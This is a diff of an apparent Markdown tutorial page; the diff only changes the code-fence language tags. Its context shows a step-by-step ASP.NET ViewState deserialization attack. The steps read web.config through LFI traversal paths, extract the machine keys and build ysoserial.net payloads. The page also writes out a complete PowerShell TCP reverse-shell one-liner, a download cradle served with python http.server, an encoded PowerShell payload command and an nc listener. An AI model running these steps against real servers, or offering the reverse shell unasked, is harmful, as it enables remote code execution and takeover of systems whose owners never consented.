@@ -18,13 +18,13 @@ excerpt: "Technical understanding and practical overview"
 ## Locate the `web.config` file via LFI
 If you find a Local File Inclusion (LFI) vulnerability, you can often read `web.config`:
 
-```text
+```bash
 ../../web.config
 ..././web.config    # directory traversal / directory skipping techniques may be required
 
 ###  Read know
 if you get this `web.config` file, know it's time to extract some important info from there.
-```langauge
+```bash
 # We Need this Info:-
    --validationalg=
    --validationkey=
@@ -33,17 +33,17 @@ if you get this `web.config` file, know it's time to extract some important info
 ```
 ### Generate a Ysoserial Payload
 we need windows to Generate this payload.Git clone this tool in windwos and run it. [Tool Here](https://github.com/pwntester/ysoserial.net/releases)
-```language
+```bash
 #this payload run the whoami command only !
 .\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/Home/Download" --apppath="/"  --decryptionalg="AES"  --decryptionkey="xyz" --validationkey="xyz" --validationalg="HMACSHA256" -c "whoami"
 ```
 ## Create a 0xmr.ps1 file
 Change the ip address here
-```language
+```bash
 $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 # Create a cradle
-```language
+```bash
 # Create the cradle file (example using nano)
 nano cradle
 
@@ -58,11 +58,11 @@ python3 -m http.server 8000
 ```
 ## Generate a Reverse Shell
 Replace the `path` and `<encoded code here>` with your Base64-encoded cradle or an encoded PowerShell command.
-```language
+```bash
 .\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/Home/Download" --apppath="/"  --decryptionalg="AES"  --decryptionkey="xyz" --validationkey="xyz" --validationalg="HMACSHA256" -c "powershell -enc <encoded code here>" #paste that payload here
 ```
 ## Start a listner
-```language
+```bash
 rlwrap nc -lvnp 9001
 ```
 
